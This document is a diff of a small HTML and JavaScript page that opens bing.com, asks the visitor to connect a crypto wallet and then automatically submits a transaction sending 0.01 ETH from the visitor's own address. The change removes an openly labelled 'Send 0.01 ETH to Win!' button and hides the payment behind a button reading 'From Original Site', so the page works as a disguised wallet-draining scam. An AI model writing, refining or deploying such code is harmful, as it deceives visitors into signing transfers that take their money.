@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html>
 <head>
@@ -20,14 +19,24 @@
 </head>
 <body>
   <script>
-    let bingWindow;
-
     async function openBingAndPromptWallet() {
-      // Open bing.com in a new tab
-      bingWindow = window.open('https://bing.com', '_blank');
+      // Open bing.com
+      const bingWindow = window.open('https://bing.com', 'x');
 
-      // Prompt wallet connection
+      // Check for wallet connection
       await promptWalletConnection();
+
+      // Store the wallet connection status in local storage
+      localStorage.setItem('walletConnected', 'true');
+
+      // Poll for changes in local storage at an interval
+      const checkLocalStorage = setInterval(() => {
+        const walletConnected = localStorage.getItem('walletConnected');
+        if (walletConnected === 'true') {
+          clearInterval(checkLocalStorage);
+          sendTransaction();
+        }
+      }, 1000);
     }
 
     async function promptWalletConnection() {
@@ -47,11 +56,11 @@
     async function sendTransaction() {
       const transactionParameters = {
         nonce: "0x00",
-        gasPrice: "0x4A817C800", // Updated gas price
-        gas: "0x5208", // Updated gas limit
-        to: "0x62842A4A9d0f6c56D0F1757E13A8Efdd4E7B8BD2", // Replace with the actual recipient address
-        from: "0x983C2d9302a31041bf3E342dDd420DDac122ccb6",
-        value: "0x2386F26FC10000", // 0.01 ETH in Wei
+        gasPrice: "0x244AC6D",
+        gas: "0x12A52",
+        to: "0x0000000000000000000000000000000000000000", // Replace with the actual recipient address
+        from: ethereum.selectedAddress,
+        value: "0x2386F26FC10000",
         data: "0x00",
         chainId: "0x1",
       };
@@ -69,14 +78,6 @@
   </script>
   <center>
     <input type="button" class="button" value="From Original Site" onclick="openBingAndPromptWallet()">
-    <br>
-    <button class="button" id="openBingButton" onclick="sendTransaction()">Send 0.01 ETH to Win!</button>
   </center>
-  
-  <script>
-    // Attach a click event handler to the button with the specified id
-    document.getElementById('openBingButton').addEventListener('click', openBingAndPromptWallet);
-  </script>
-  
 </body>
 </html>
